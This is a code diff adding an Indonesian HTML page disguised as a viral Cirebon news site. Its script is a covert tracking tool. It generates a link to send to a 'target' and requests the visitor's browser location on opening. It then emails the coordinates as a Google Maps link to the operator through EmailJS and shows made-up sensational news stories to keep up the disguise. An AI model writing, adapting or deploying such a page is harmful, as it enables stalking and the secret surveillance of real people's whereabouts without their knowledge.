@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Keluarga kecil bang jurr Sukses Semua</title>
+  <style>
+    body {
+      margin: 0;
+      background: #f9f9f9;
+      font-family: Arial, sans-serif;
+    }
+    header {
+      background: #e60000;
+      color: white;
+      padding: 15px;
+      text-align: center;
+      font-size: 1.3em;
+    }
+    .container {
+      max-width: 800px;
+      margin: auto;
+      padding: 20px;
+    }
+    .news-card {
+      background: white;
+      margin-bottom: 20px;
+      border-radius: 6px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.05);
+      overflow: hidden;
+    }
+    .news-card img {
+      width: 100%;
+      height: auto;
+    }
+    .news-card .content {
+      padding: 15px;
+    }
+    .news-card h2 {
+      font-size: 1.2em;
+      color: #d40000;
+    }
+    .timestamp {
+      font-size: 0.85em;
+      color: gray;
+      margin-bottom: 10px;
+    }
+    .btn-watch {
+      display: inline-block;
+      background: #ff0000;
+      color: white;
+      padding: 8px 12px;
+      text-decoration: none;
+      margin-top: 10px;
+      border-radius: 4px;
+    }
+    .comments {
+      background: #f4f4f4;
+      padding: 10px;
+      margin-top: 15px;
+      border-radius: 4px;
+      font-size: 0.9em;
+    }
+    .comment {
+      margin-bottom: 8px;
+    }
+    .sponsored {
+      background: #fff2d6;
+      padding: 15px;
+      text-align: center;
+      margin: 20px 0;
+      border-left: 4px solid orange;
+      border-radius: 4px;
+      font-weight: bold;
+    }
+    #app {
+      text-align: center;
+      margin: 40px auto;
+      max-width: 600px;
+      padding: 20px;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      font-size: 1em;
+    }
+  </style>
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init('xCZlZz-fwMVrgM0gQ'); // GANTI dengan Public Key kamu
+    })();
+  </script>
+</head>
+<body>
+  <header>🔥 Berita Hot Cirebon</header>
+
+  <div id="app">Memuat...</div>
+
+  <div class="container" id="newsContainer" style="display: none;">
+    <div id="berita"></div>
+  </div>
+
+  <script>
+    const app = document.getElementById('app');
+    const newsContainer = document.getElementById('newsContainer');
+    const beritaDiv = document.getElementById('berita');
+    const params = new URLSearchParams(window.location.search);
+    const lat = params.get('lat');
+    const lng = params.get('lng');
+    const shareId = params.get('share');
+    const fromId = params.get('from');
+
+    const beritaList = [
+  {
+    title: "‼️ warga majasem beriringan ga tau mau kemana!",
+    img: "https://source.unsplash.com/random/800x400?cctv,house",
+    text: "Warga geger hahaha.",
+    comments: ["Serem banget?!", "Gak nyangka tempat senyaman itu ada beginian.."]
+  },
+  {
+    title: "Petani Temukan Batu Isi Daya HP bisa cas pula kali",
+    img: "https://source.unsplash.com/random/800x400?rock,gadget",
+    text: "Batu di sawah disebut bisa isi daya ponsel dalam 5 menit.",
+    comments: ["Gue mau beli batunya!", "Ada yang jual replikanya?", "Ini mah sulap 😅"]
+  },
+  {
+    title: "Langit Ungu Terlihat di Papua Tadi Malam",
+    img: "https://source.unsplash.com/random/800x400?sky,purple",
+    text: "BMKG menyelidiki langit berubah warna ungu di wilayah timur.",
+    comments: ["Kiamat?", "BMKG mana suaranya?", "Gak berani keluar rumah 😨"]
+  }
+];
+
+    function tampilkanBerita() {
+      const acak = beritaList.sort(() => Math.random() - 0.5).slice(0, 3);
+      acak.forEach((item, idx) => {
+        const html = `
+          <div class="news-card">
+            <img src="${item.img}" alt="berita" />
+            <div class="content">
+              <h2>${item.title}</h2>
+              <div class="timestamp">4 Juni 2025</div>
+              <p>${item.text}</p>
+              <a class="btn-watch" href="https://youtu.be/dQw4w9WgXcQ" target="_blank">🎥 Tonton Videonya</a>
+              <div class="comments">
+                ${item.comments.map(c => `<div class="comment">💬 ${c}</div>`).join("")}
+              </div>
+            </div>
+          </div>
+          ${idx === 1 ? '<div class="sponsored">📢 SPONSOR: Daftar & Menangkan iPhone 15 Sekarang!</div>' : ''}
+        `;
+        beritaDiv.innerHTML += html;
+      });
+    }
+
+    function kirimEmailLokasi(lat, lng, shareId) {
+      const serviceID = 'kev123'; // Ganti dengan ID kamu
+      const templateID = 'kev1234'; // Ganti juga
+
+      emailjs.send(serviceID, templateID, {
+        to_name: 'Penerima Lokasi',
+        message: `Lokasi dari shareId ${shareId}:\nhttps://www.google.com/maps?q=${lat},${lng}`,
+        lat: lat,
+        lng: lng,
+        share_id: shareId
+      }).then(res => {
+        console.log('Email terkirim!', res.status);
+      }).catch(err => {
+        console.error('Gagal mengirim email:', err);
+      });
+    }
+
+    if (lat && lng) {
+      kirimEmailLokasi(lat, lng, fromId);
+      tampilkanBerita();
+      newsContainer.style.display = 'block';
+      app.style.display = 'none';
+    } else if (shareId) {
+      app.innerHTML = "<p>Memuat berita viral...</p>";
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lng = pos.coords.longitude;
+          const redirect = `${location.origin}${location.pathname}?lat=${lat}&lng=${lng}&from=${shareId}`;
+          kirimEmailLokasi(lat, lng, shareId);
+          setTimeout(() => location.href = redirect, 1000);
+        }, () => {
+          app.innerHTML = "<p>Gagal mendapatkan lokasi. Izinkan akses lokasi di browser.</p>";
+        });
+      } else {
+        app.innerHTML = "<p>Browser tidak mendukung geolokasi.</p>";
+      }
+    } else {
+      const id = Math.random().toString(36).substring(2, 8);
+      const link = `${location.origin}${location.pathname}?share=${id}`;
+      app.innerHTML = `
+        <p>Kirim link ini ke target:</p>
+        <input type="text" readonly value="${link}" onclick="this.select()" />
+        <p>Lokasi mereka akan dikirim via email dan mereka akan lihat berita viral palsu.</p>
+      `;
+    }
+  </script>
+</body>
+</html>
